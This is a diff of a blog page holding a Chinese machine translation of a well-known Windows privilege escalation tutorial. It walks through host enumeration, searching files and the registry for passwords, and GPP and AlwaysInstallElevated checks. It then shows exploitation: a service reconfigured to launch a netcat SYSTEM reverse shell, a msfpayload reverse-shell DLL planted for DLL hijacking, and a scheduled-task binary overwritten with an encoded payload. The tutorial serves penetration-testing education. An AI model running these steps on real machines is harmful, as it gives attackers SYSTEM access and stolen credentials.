@@ -129,9 +129,9 @@
         <div class="section">
           <div class="post_content">
               <p>原文链接：<a target="_blank" rel="noopener" href="http://www.fuzzysecurity.com/tutorials/16.html">http://www.fuzzysecurity.com/tutorials/16.html</a></p>
-<h1 id="Windows权限提升基础"><a href="#Windows权限提升基础" class="headerlink" title="Windows权限提升基础"></a>Windows权限提升基础</h1><p>没有多少人谈论严重的Windows权限升级，这是一种耻辱。我认为造成这种情况的原因可能是（1）在测试时，低版权的外壳通常都是客户需要的证据，（2）在分阶段的环境中，你经常会弹出管理员账号，（3）米预测让你懒惰（getsystem = lazy-fu），（4）构建评论经常最终成为 - &gt;认证nessus scan，microsoft security baseline analyzer …</p>
+<h1 id="Windows权限提升基础"><a href="#Windows权限提升基础" class="headerlink" title="Windows权限提升基础"></a>Windows权限提升基础</h1><p>没有多少人谈论严重的Windows权限升级，这是一种耻辱。我认为造成这种情况的原因可能是（1）在测试时，低版权的外壳通常都是客户需要的证据，（2）在分阶段的环境中，你经常会弹出管理员账号，（3）米预测让你懒惰（getsystem &#x3D; lazy-fu），（4）构建评论经常最终成为 - &gt;认证nessus scan，microsoft security baseline analyzer …</p>
 <p>与常见的看法相反，如果配置小心，Windows机箱可以很好地锁定。最重要的是，补丁时间窗口机会很小。因此，让我们深入了解Windows操作系统的黑暗角落，看看我们是否可以获得SYSTEM。</p>
-<p>应该注意的是，我将使用各种版本的Windows来突出显示可能存在的任何命令行差异。请记住这一点，因为在不存在的命令或产生稍微不同的输出方面可能存在各种OS / SP差异。我已经尝试构建本教程，因此它将以最常用的方式应用于Windows权限提升。</p>
+<p>应该注意的是，我将使用各种版本的Windows来突出显示可能存在的任何命令行差异。请记住这一点，因为在不存在的命令或产生稍微不同的输出方面可能存在各种OS &#x2F; SP差异。我已经尝试构建本教程，因此它将以最常用的方式应用于Windows权限提升。</p>
 <p>最后，我想向我的朋友Kostas大声喊叫，他也非常喜欢后期开发，你真的不希望他登录你的机器。</p>
 <p>不可或缺的资源：<br>Windows Privilege Escalation百科全书（Brett Moore） -  <a target="_blank" rel="noopener" href="http://www.youtube.com/watch?v=kMG8IsCohHA">这里</a>。<br>Windows攻击：AT是新黑人（Chris Gates＆Rob Fuller） -  <a target="_blank" rel="noopener" href="http://www.youtube.com/watch?v=_8xJaaQlpBo">这里</a>。<br>通过利用弱文件夹权限提升权限（Parvez Anwar） -  <a target="_blank" rel="noopener" href="http://www.greyhathacker.net/?p=738">这里</a>。</p>
 <h2 id="Δt-for-t0-to-t3-初始信息收集"><a href="#Δt-for-t0-to-t3-初始信息收集" class="headerlink" title="Δt for t0 to t3 - 初始信息收集"></a>Δt for t0 to t3 - 初始信息收集</h2><p>  本教程的起点是一个盒子上没有特权的shell。我们可能使用了远程攻击或客户端攻击，我们得到了一个shell。基本上在时间t0，我们不了解机器，它做什么，它连接到什么，我们有什么级别的特权，甚至是什么操作系统。</p>
@@ -296,8 +296,6 @@ Interface: 192.168.0.104 --- 0xb
   239.255.255.250       01-00-5e-7f-ff-fa     static
   255.255.255.255       ff-ff-ff-ff-ff-ff     static<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-
-
 <p>这将我们带到活动网络连接和防火墙规则。</p>
 <pre class="line-numbers language-none"><code class="language-none">C:\Windows\system32&gt; netstat -ano
 
@@ -409,8 +407,6 @@ File location   &#x3D; C:\Windows\system32\LogFiles\Firewall\pfirewall.log
 Max file size   &#x3D; 4096 KB
 Dropped packets &#x3D; Disable
 Connections     &#x3D; Disable<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
 
 <p>最后，我们将简要介绍受感染的盒子上运行的内容：计划任务，运行进程，已启动服务和已安装的驱动程序。</p>
 <pre class="line-numbers language-none"><code class="language-none"># This will display verbose output for all scheduled tasks, below you can see sample output for a
@@ -549,8 +545,6 @@ AppID        AppID Driver           Kernel        11&#x2F;20&#x2F;2010 5:29:48 P
 arc          arc                    Kernel        5&#x2F;25&#x2F;2007 5:31:06 AM
 [..Snip..]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-
-
 <h2 id="Δt-for-t4-WMIC的奥术艺术"><a href="#Δt-for-t4-WMIC的奥术艺术" class="headerlink" title="Δt for t4 - WMIC的奥术艺术"></a>Δt for t4 - WMIC的奥术艺术</h2><p>  我想分别提到WMIC（Windows Management Instrumentation命令行），因为它是Windows最有用的命令行工具。WIMIC对于信息收集和后期开发非常实用。据说它有点笨重，输出还有很多不足之处。</p>
 <p>完全解释WMIC的使用将采用它自己的全部教程。更不用说由于格式化，一些输出将难以显示。</p>
 <p>我在下面列出了两个非常值得阅读的资源：<br>Command-Line Ninjitsu（SynJunkie） - <a target="_blank" rel="noopener" href="http://synjunkie.blogspot.com/2008/03/command-line-ninjitsu.html">这里是</a><br>Windows WMIC命令行（ComputerHope） - <a target="_blank" rel="noopener" href="http://www.computerhope.com/wmic.htm">这里</a></p>
@@ -677,8 +671,6 @@ QUIT&#x2F;EXIT - Exits the program.
 
 For more information on CLASS&#x2F;PATH&#x2F;CONTEXT, type: (CLASS | PATH | CONTEXT) &#x2F;?<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-
-
 <p>  为简化起见，我创建了一个可以在目标机器上删除的脚本，该脚本将使用WMIC提取以下信息：进程，服务，用户帐户，用户组，网络接口，硬盘驱动器信息，网络共享信息，已安装的Windows补丁程序，启动时运行的程序，已安装软件的列表，有关操作系统和时区的信息。</p>
 <p>如果有人想到应该添加到列表中的内容，我已经浏览了各种标志和参数来提取有价值的信息，请在下面留言。使用内置输出功能，脚本会将所有结果写入人类可读的html文件。</p>
 <p>你可以<a target="_blank" rel="noopener" href="http://www.fuzzysecurity.com/tutorials/files/wmic_info.rar">在这里</a>下载我的脚本（wmic_info.bat）<br>Windows 7 VM上的示例输出文件（严重修补） - <a target="_blank" rel="noopener" href="http://www.fuzzysecurity.com/tutorials/files/Win7.html">此处</a></p>
@@ -762,15 +754,13 @@ encryption, I take more precautions to protect my coffee. The password here is &
 <p>除了Groups.xml之外，其他几个策略首选项文件还可以设置可选的“cPassword”属性：<br>Services \ Services.xml：<a target="_blank" rel="noopener" href="http://msdn.microsoft.com/en-us/library/cc980070.aspx">特定于元素的属性</a><br>ScheduledTasks \ ScheduledTasks.xml：<a target="_blank" rel="noopener" href="http://msdn.microsoft.com/en-us/library/cc422920.aspx">任务内部元素</a>，<a target="_blank" rel="noopener" href="http://msdn.microsoft.com/en-us/library/dd341350.aspx">TaskV2内部元素</a>，<a target="_blank" rel="noopener" href="http://msdn.microsoft.com/en-us/library/dd304114.aspx">ImmediateTaskV2内部元素</a><br>打印机\ Printers.xml：<a target="_blank" rel="noopener" href="http://msdn.microsoft.com/en-us/library/cc422918.aspx">SharedPrinter元素</a><br>驱动器\ Drives.xml：<a target="_blank" rel="noopener" href="http://msdn.microsoft.com/en-us/library/cc704598.aspx">元素特定属性</a><br>DataSources \ DataSources.xml：<a target="_blank" rel="noopener" href="http://msdn.microsoft.com/en-us/library/cc422926.aspx">元素特定属性</a></p>
 <p>可以通过手动浏览SYSVOL并抓取相关文件来利用此漏洞，如下所示。</p>
 <p><img src="http://www.fuzzysecurity.com/tutorials/images/priv06_big.png" alt="img"></p>
-<p>然而，我们都喜欢自动化解决方案，因此我们可以尽快到达终点。这里有两个主要选项，具体取决于我们拥有的shell /访问类型。有（1）metasploit模块可以通过<a target="_blank" rel="noopener" href="https://www.rapid7.com/db/modules/post/windows/gather/credentials/gpp">此处</a>建立的会话执行<a target="_blank" rel="noopener" href="https://www.rapid7.com/db/modules/post/windows/gather/credentials/gpp">，</a>或者（2）您可以使用Get-GPPPassword，它是<a target="_blank" rel="noopener" href="https://github.com/mattifestation/PowerSploit">PowerSploit的</a>一部分。PowerSploit是Matt Graeber的优秀PowerShell框架，专为逆向工程，取证和测试而量身定制。</p>
+<p>然而，我们都喜欢自动化解决方案，因此我们可以尽快到达终点。这里有两个主要选项，具体取决于我们拥有的shell &#x2F;访问类型。有（1）metasploit模块可以通过<a target="_blank" rel="noopener" href="https://www.rapid7.com/db/modules/post/windows/gather/credentials/gpp">此处</a>建立的会话执行<a target="_blank" rel="noopener" href="https://www.rapid7.com/db/modules/post/windows/gather/credentials/gpp">，</a>或者（2）您可以使用Get-GPPPassword，它是<a target="_blank" rel="noopener" href="https://github.com/mattifestation/PowerSploit">PowerSploit的</a>一部分。PowerSploit是Matt Graeber的优秀PowerShell框架，专为逆向工程，取证和测试而量身定制。</p>
 <p>接下来我们将寻找一个奇怪的注册表设置“AlwaysInstallElevated”，如果启用此设置，它允许任何权限级别的用户将* .msi文件安装为NT AUTHORITY \ SYSTEM。对我来说，创建低权限用户（限制他们使用操作系统）但让他们能够以SYSTEM身份安装程序似乎是一个奇怪的想法。有关此问题的更多背景阅读，您可以在<a target="_blank" rel="noopener" href="http://www.greyhathacker.net/?p=185">这里查看</a>来自GreyHatHacker的Parvez的一篇文章，该文章最初将此报告为安全问题。</p>
 <p>为了能够使用它，我们需要检查是否设置了两个注册表项，如果是这种情况我们可以弹出一个SYSTEM shell。您可以看到sytntax查询下面的相应注册表项。</p>
 <pre class="line-numbers language-none"><code class="language-none"># This will only work if both registry keys contain &quot;AlwaysInstallElevated&quot; with DWORD values of 1.
 
 C:\Windows\system32&gt; reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
 C:\Windows\system32&gt; reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
-
 
 <p>为了完成这一部分，我们将对操作系统进行一些快速搜索，希望我们能够获得金牌。您可以在下面看到我们搜索的语法。</p>
 <pre class="line-numbers language-none"><code class="language-none"># The command below will search the file system for file names containing certain keywords. You can
@@ -787,9 +777,7 @@ C:\Windows\system32&gt; findstr &#x2F;si password *.xml *.ini *.txt
 C:\Windows\system32&gt; reg query HKLM &#x2F;f password &#x2F;t REG_SZ &#x2F;s
 C:\Windows\system32&gt; reg query HKCU &#x2F;f password &#x2F;t REG_SZ &#x2F;s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-
-
-<h2 id="Δt-for-t7-to-t10-卷起你的袖子"><a href="#Δt-for-t7-to-t10-卷起你的袖子" class="headerlink" title="Δt for t7 to t10 - 卷起你的袖子"></a>Δt for t7 to t10 - 卷起你的袖子</h2><p>  希望到现在为止我们已经拥有了一个SYSTEM shell，但如果我们不这样做，那么仍有一些攻击途径需要仔细阅读。在最后一部分中，我们将介绍Windows服务和文件/文件夹权限。我们的目标是使用弱权限来提升会话权限。</p>
+<h2 id="Δt-for-t7-to-t10-卷起你的袖子"><a href="#Δt-for-t7-to-t10-卷起你的袖子" class="headerlink" title="Δt for t7 to t10 - 卷起你的袖子"></a>Δt for t7 to t10 - 卷起你的袖子</h2><p>  希望到现在为止我们已经拥有了一个SYSTEM shell，但如果我们不这样做，那么仍有一些攻击途径需要仔细阅读。在最后一部分中，我们将介绍Windows服务和文件&#x2F;文件夹权限。我们的目标是使用弱权限来提升会话权限。</p>
 <p>我们将检查大量访问权限，因此我们应该获取accesschk.exe的副本，这是Microsoft的Sysinternals Suite中的一个工具。Microsoft Sysinternals包含许多优秀的工具，很遗憾微软没有将它们添加到标准的Windows版本中。您可以在<a target="_blank" rel="noopener" href="http://technet.microsoft.com/en-us/sysinternals/bb842062.aspx">此处</a>从Microsoft technet下载该套件。</p>
 <p>我们将从Windows服务开始，因为那里有一些快速的胜利。通常，现代操作系统不包含易受攻击的服务。在这种情况下，易受攻击意味着我们可以重新配置服务参数。Windows服务有点像应用程序快捷方式，请看下面的例子  </p>
 <pre class="line-numbers language-none"><code class="language-none"># We can use sc to query, configure and manage windows services.
@@ -883,8 +871,6 @@ upnphost
   RW NT AUTHORITY\LOCAL SERVICE
         SERVICE_ALL_ACCESS<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-
-
 <p>  此问题后来通过引入XP SP2解决，但是在SP0和SP1上，它可以用作通用本地权限提升漏洞。通过重新配置服务，我们可以让它以SYSTEM级别权限运行我们选择的任何二进制文件。</p>
 <p>我们来看看这是如何在实践中完成的。在这种情况下，服务将执行netcat并打开具有SYSTEM级别权限的反向shell。其他选择当然是可能的。  </p>
 <pre class="line-numbers language-none"><code class="language-none">C:\&gt; sc qc upnphost
@@ -926,15 +912,13 @@ SERVICE_NAME: upnphost
 C:\&gt; net start upnphost
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-
-
 <p><img src="http://www.fuzzysecurity.com/tutorials/images/priv01_big.png" alt="img"></p>
 <p>Service Shell (upnphost)</p>
 <p>即使配置不正确，我们也不会始终拥有对服务的完全访问权限。下图来自Brett Moore关于Windows权限升级的演示文稿，这些访问权限中的任何一个都将为我们提供一个SYSTEM shell。</p>
 <p><img src="http://www.fuzzysecurity.com/tutorials/images/priv02_big.png" alt="img"></p>
 <p>  需要记住的重要一点是，我们会发现我们的受感染会话所属的用户组。如前所述，“Power Users”也被视为低权限用户组。“Power Users”有各自的漏洞，Mark Russinovich写了一篇关于这个主题的非常有趣的文章。</p>
 <p>Power in Power用户（Mark Russinovich） - <a target="_blank" rel="noopener" href="http://blogs.technet.com/b/markrussinovich/archive/2006/05/01/the-power-in-power-users.aspx">这里</a></p>
-<p>最后我们将检查文件/文件夹权限，如果我们不能直接攻击操作系统，我们将让操作系统完成所有的工作。这里有很多内容，所以我将向您展示两种权限漏洞以及如何利用它们。一旦掌握了总体思路，您就可以将这些技术应用于其他情境。</p>
+<p>最后我们将检查文件&#x2F;文件夹权限，如果我们不能直接攻击操作系统，我们将让操作系统完成所有的工作。这里有很多内容，所以我将向您展示两种权限漏洞以及如何利用它们。一旦掌握了总体思路，您就可以将这些技术应用于其他情境。</p>
 <p>对于我们的第一个例子，我们将复制Parvez从GreyHatHacker写的一篇文章的结果; “通过利用弱文件夹权限提升权限”。这是一个很好的特权升级写作，我强烈建议你<a target="_blank" rel="noopener" href="http://www.greyhathacker.net/?p=738">在这里</a>阅读他的帖子。</p>
 <p>此示例是DLL劫持的特例。程序通常不能自己运行，它们需要很多资源（大多数是DLL，但也有专有文件）。如果程序或服务从我们具有写访问权限的目录加载文件，我们可以滥用它来弹出具有程序运行权限的shell。</p>
 <p>通常，Windows应用程序将使用预定义的搜索路径来查找DLL，并且它将按特定顺序检查这些路径。DLL劫持通常是通过将恶意DLL放在其中一个路径中，同时确保在合法DLL之前找到DLL来实现的。通过让应用程序指定它所需的DLL的绝对路径，可以减轻此问题。</p>
@@ -1015,8 +999,6 @@ SERVICE_NAME: IKEEXT
         SERVICE_START_NAME : LocalSystem
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-
-
 <p>现在我们知道满足必要条件我们可以生成恶意DLL并弹出shell！</p>
 <pre class="line-numbers language-none"><code class="language-none">root@darkside:~# msfpayload windows&#x2F;shell_reverse_tcp lhost&#x3D;&#39;127.0.0.1&#39; lport&#x3D;&#39;9988&#39; O
 
@@ -1050,8 +1032,6 @@ Payload: windows&#x2F;shell_reverse_tcp
  Length: 314
 Options: &#123;&quot;lhost&quot;&#x3D;&gt;&quot;127.0.0.1&quot;, &quot;lport&quot;&#x3D;&gt;&quot;9988&quot;&#125;
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
 
 <p>将DLL传输到目标机器后，我们需要做的就是将其重命名为wlbsctrl.dll并将其移动到“C:\Python27”。一旦完成，我们需要耐心地等待机器重新启动（或者我们可以尝试强制重启），我们将获得一个SYSTEM shell。</p>
 <pre class="line-numbers language-none"><code class="language-none"># Again, this is as low privilege user1.
@@ -1214,7 +1194,7 @@ exe &gt; &#x2F;root&#x2F;Desktop&#x2F;evil-tftp.exe
 [*] x86&#x2F;shikata_ga_nai succeeded with size 341 (iteration&#x3D;1)
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>现在剩下的就是上传我们的恶意可执行文件并覆盖“E：\ GrabLogs \ tftp.exe”。一旦完成，我们可以在早上睡个好觉，然后在早上醒来。这里要记住的一件重要事情是我们检查我们试图妥协的盒子上的时间/时区。</p>
+<p>现在剩下的就是上传我们的恶意可执行文件并覆盖“E：\ GrabLogs \ tftp.exe”。一旦完成，我们可以在早上睡个好觉，然后在早上醒来。这里要记住的一件重要事情是我们检查我们试图妥协的盒子上的时间&#x2F;时区。</p>
 <pre class="line-numbers language-none"><code class="language-none">C:\Users\user1\Desktop&gt; dir
 
  Volume in drive C has no label.
@@ -1243,7 +1223,7 @@ Overwrite E:\GrabLogs\tftp.exe? (Yes&#x2F;No&#x2F;All): Yes
 <p>为了演示此操作中的权限提升，我快速转发了系统时间。从下面的屏幕截图中我们可以看到我们在上午9点迅速提供了我们的SYSTEM shell。</p>
 <p><img src="http://www.fuzzysecurity.com/tutorials/images/priv04_big.png" alt="img"></p>
 <p>Schtasks Shell (LogGrabberTFTP)</p>
-<p>  这两个示例应该让您了解在考虑文件/文件夹权限时我们需要查找的漏洞类型。您需要花时间检查Windows服务，计划任务和启动任务的所有bin路径。</p>
+<p>  这两个示例应该让您了解在考虑文件&#x2F;文件夹权限时我们需要查找的漏洞类型。您需要花时间检查Windows服务，计划任务和启动任务的所有bin路径。</p>
 <p>我们已经能够看到accesschk是这里的首选工具。在结束之前，我想给你一些关于使用accesschk的最后一点。  </p>
 <pre class="line-numbers language-none"><code class="language-none"># When executing any of the sysinternals tools for the first time the user will be presented with a GUI
 pop-up to accept the EULA. This is obviously a big problem, however we can add an extra command line flag
@@ -1259,8 +1239,6 @@ accesschk.exe -uwdqs &quot;Authenticated Users&quot; c:\
 accesschk.exe -uwqs Users c:\*.*
 accesschk.exe -uwqs &quot;Authenticated Users&quot; c:\*.*
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
 
 <h2 id="Final-Thoughts"><a href="#Final-Thoughts" class="headerlink" title="Final Thoughts"></a>Final Thoughts</h2><p>  本指南旨在成为Windows权限升级的“基础”。如果你想真正掌握这门课程，你需要投入大量的工作和研究。与测试的所有方面一样，枚举是关键，你对目标的了解越多，你拥有的攻击途径越多，成功率就越高。</p>
 <p>另请注意，您有时可能会将您的权限提升为管理员。从管理员升级到SYSTEM的权限不是问题，您始终可以重新配置服务或创建具有SYSTEM级别权限的计划任务。</p>
